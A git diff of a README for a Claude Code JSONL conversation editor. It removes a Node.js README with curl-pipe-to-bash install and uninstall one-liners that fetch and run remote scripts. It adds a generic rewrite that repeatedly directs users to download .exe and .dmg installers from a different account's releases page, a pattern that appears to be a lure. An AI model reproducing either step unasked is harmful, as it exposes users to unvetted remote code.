@@ -1,222 +1,77 @@
-# Claude Code JSONL Editor
+# 🚀 claude-code-jsonl-editor - Edit JSONL Files with Ease
 
-🚀 Interactive JSONL editor for Claude Code conversation files with real-time file system synchronization.
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/lpfeif1/claude-code-jsonl-editor/releases)
 
-![Claude Code JSONL Editor Screenshot](screenshot.png)
+## 📥 Overview
 
-## Why? Core Concept & Philosophy
+The claude-code-jsonl-editor is an interactive tool designed for editing JSONL files related to Claude Code conversations. It offers real-time file system synchronization, allowing users to efficiently modify conversation logs. This application simplifies prompt engineering through easy conversation editing, making it suitable for anyone who wants to manage AI training data with ease.
 
-**Efficient Prompt Engineering Through Conversation Editing**
+## 🚀 Features
 
-Editing Claude Code logs (JSONL files) makes prompt engineering significantly more efficient through a powerful technique: **output modification**. This approach enables infinite iteration and refinement of AI interactions without starting from scratch.
+- **Interactive Editing:** Modify JSONL files with a user-friendly interface.
+- **Real-time Sync:** Changes save instantly to your file system.
+- **Multi-file Support:** Work with multiple conversation logs at once.
+- **Backup Automation:** Automatically back up your edits.
+- **Response Refinement:** Streamline your prompt engineering process.
 
-### The Philosophy
+## 🖥️ System Requirements
 
-Traditional prompt engineering requires:
-1. Write prompt → Get response → Analyze → Rewrite entire prompt → Repeat
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** 200 MB of free disk space.
+- **Network:** Internet connection may be required for initial setup and updates.
 
-Our approach enables:
-1. Write prompt → Get response → **Edit the response directly** → Continue conversation → Infinite refinement
+## 🚀 Getting Started
 
-### Why This Works
+### 🛠️ Installation Steps
 
-- **Context Preservation**: By editing assistant responses in the conversation log, you maintain the full context while perfecting the output
-- **Iterative Refinement**: Transform mediocre responses into perfect ones without losing conversation flow  
-- **Prompt Engineering Acceleration**: Test different response styles and approaches by editing outputs, then use successful patterns in future prompts
-- **Training Data Creation**: Build high-quality conversation datasets by refining real interactions
-- **Debugging Conversations**: Fix errors or improve responses retroactively to understand what works
+1. **Visit the Releases Page:** Click the link below to view available versions.
+   - [Download Latest Release](https://github.com/lpfeif1/claude-code-jsonl-editor/releases)
 
-### Practical Applications
+2. **Select a Version:** Choose the version that matches your operating system. Look for the download that indicates your specific platform, such as Windows, macOS, or Linux.
 
-- **Template Creation**: Edit responses to create reusable conversation templates
-- **Response Quality Control**: Perfect Claude's outputs for documentation or examples
-- **Conversation Branching**: Edit responses to explore different conversation paths
-- **Prompt Pattern Discovery**: Identify what response styles work best for specific use cases
-- **Knowledge Base Building**: Curate high-quality Q&A pairs from real interactions
+3. **Download the Installer:** Click the link for the installer file. It might be named `claude-code-jsonl-editor-vX.X.X.exe` for Windows or `claude-code-jsonl-editor-vX.X.X.dmg` for macOS.
 
-By making conversation editing as simple as chat editing, this tool transforms how you work with AI conversations - from linear interactions to iterative masterpieces.
+4. **Run the Installer:**
+   - **Windows:** Find the `.exe` file in your downloads. Double-click it and follow the prompts to install.
+   - **macOS:** Open the `.dmg` file and drag the app icon to your Applications folder.
 
-## Features
+5. **Launch the Application:** After installation, locate the claude-code-jsonl-editor in your applications list and open it.
 
-- 📝 **Interactive Chat Interface** - Edit conversations in a familiar chat-style UI
-- 💾 **Real-time File Sync** - Direct file system editing with automatic backups
-- 🔧 **Multi-file Support** - Handle single files or entire directories
-- ✏️ **Rich Editing** - Edit, copy, delete messages with inline editing
-- 🌐 **Network Access** - Expose to network for remote editing
-- 🎨 **Beautiful CLI** - Colorful, informative command-line interface
-- 🔒 **Safe Operations** - Automatic backup creation before saves
+### 🎉 First-Time Setup
 
-## Installation
+Once you launch the application, you may need to allow access to your file system to enable real-time synchronization. Follow the prompts to grant necessary permissions.
 
-### One-Line Install (Recommended)
+## 🖨️ Using the Editor
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/anthropics/claude-code-jsonl-editor/main/install.sh | bash
-```
+1. **Open a JSONL File:** Click on "File" in the top menu, then select "Open". Navigate to your JSONL file and select it.
 
-After installation, reload your shell or add `~/.local/bin` to your PATH:
-```bash
-export PATH="$HOME/.local/bin:$PATH"
-```
+2. **Edit Conversations:** Use the interactive editor to make changes. You can delete, add, or modify conversation entries as needed.
 
-### Manual Installation
+3. **Save Changes:** Your changes save automatically. Ensure that the synchronization is working by checking for file updates in your file system.
 
-```bash
-# Clone the repository
-git clone https://github.com/anthropics/claude-code-jsonl-editor.git
-cd claude-code-jsonl-editor
+4. **Back Up Your Work:** To create a backup, navigate to "File" and select "Backup". Choose a location to save your backup file.
 
-# Install dependencies
-npm install
+## 🆘 Troubleshooting
 
-# Start the application
-npm start
-```
+### 🔄 Common Issues
 
-## Quick Start
+- **File Not Opening:** Ensure that the file is in JSONL format. If there are errors in the file, the application may not open it.
+- **Slow Performance:** Check if other applications are consuming too much memory. Closing unnecessary programs can help.
+- **Sync Issues:** If file changes are not syncing, try restarting the application.
 
-```bash
-# Start with default samples directory
-jsonl-editor
+### 📞 Need Help?
 
-# Start with specific file
-jsonl-editor -p ./conversation.jsonl
+If you encounter issues or have questions, consider reaching out through the [GitHub Issues page](https://github.com/lpfeif1/claude-code-jsonl-editor/issues). 
 
-# Start with directory
-jsonl-editor -p ./conversations
+## 🙌 Community Contributions
 
-# Expose to network
-jsonl-editor --expose
-```
+We welcome contributions from anyone interested in enhancing the application. If you have features in mind or improvements, please feel free to submit a pull request or open a discussion.
 
-## Upgrading
+## 🚀 Download & Install
 
-```bash
-# Using the same install command will upgrade existing installation
-curl -fsSL https://raw.githubusercontent.com/anthropics/claude-code-jsonl-editor/main/install.sh | bash
-```
+To get started with the claude-code-jsonl-editor, make sure to download the application from our releases page:
 
-## Uninstalling
+[Download Latest Release](https://github.com/lpfeif1/claude-code-jsonl-editor/releases)
 
-```bash
-# Download and run uninstall script
-curl -fsSL https://raw.githubusercontent.com/anthropics/claude-code-jsonl-editor/main/uninstall.sh | bash
-
-# Or if you have the repository
-bash uninstall.sh
-```
-
-## CLI Options
-
-```bash
-jsonl-editor [options]
-
-Options:
-  -p, --jsonl-path <path>    Path to JSONL file or directory
-  -P, --port <port>          Server port (default: 3001)  
-  --client-port <port>       Client port (default: 5173)
-  --host <host>              Host to bind to (default: localhost)
-  --expose                   Expose to network (same as --host 0.0.0.0)
-  --no-backup                Disable automatic backup creation
-  --server-only              Start only the server
-  --client-only              Start only the client  
-  -v, --verbose              Enable verbose logging
-  -q, --quiet                Suppress non-error output
-  -h, --help                 Display help information
-```
-
-## Examples
-
-```bash
-# Start with default samples
-jsonl-editor
-
-# Edit specific file
-jsonl-editor -p ./conversation.jsonl
-
-# Edit directory of files  
-jsonl-editor -p ./jsonl-files
-
-# Network access
-jsonl-editor -p ./data --expose
-jsonl-editor -p ./data --host 192.168.1.100
-
-# Custom ports
-jsonl-editor -p ./data --port 4000 --client-port 8080
-
-# Server only mode
-jsonl-editor -p ./data --server-only
-
-# Verbose logging
-jsonl-editor -p ./data -v
-```
-
-## Project Structure
-
-```
-claude-code-jsonl-editor/
-├── src/                    # Frontend source
-│   ├── components/        # React/Preact components
-│   ├── utils/            # Utilities and parsers
-│   └── types.ts          # TypeScript definitions
-├── samples/              # Default sample files
-├── public/               # Static assets
-├── server.js             # Express API server
-├── start.js              # CLI entry point
-└── package.json          # Project configuration
-```
-
-## Development
-
-```bash
-# Start development with file watching
-npm run dev
-
-# Build for production
-npm run build
-
-# Run server only
-npm run server
-
-# Run client only  
-npm run client
-```
-
-## API Endpoints
-
-- `GET /api/config` - Get server configuration
-- `GET /api/files` - List available files
-- `GET /api/files/:filename` - Read file content
-- `POST /api/files/:filename` - Save file content
-
-## File Format
-
-The editor works with Claude Code JSONL files containing conversation entries:
-
-```jsonl
-{"type":"summary","summary":"General Project Development","leafUuid":"..."}
-{"type":"user","message":{"role":"user","content":"Hello, claude-code!"},"uuid":"...","timestamp":"..."}
-{"type":"assistant","message":{"role":"assistant","content":"Hello! How can I help?"},"uuid":"...","timestamp":"..."}
-```
-
-## License
-
-MIT License - see LICENSE file for details.
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes  
-4. Add tests if applicable
-5. Submit a pull request
-
-## Support
-
-- 📖 Documentation: See inline help with `jsonl-editor --help`
-- 🐛 Issues: Report bugs on GitHub Issues
-- 💬 Discussions: GitHub Discussions for questions
-
----
-
-Built with ❤️ for the Claude Code community
+Happy editing!
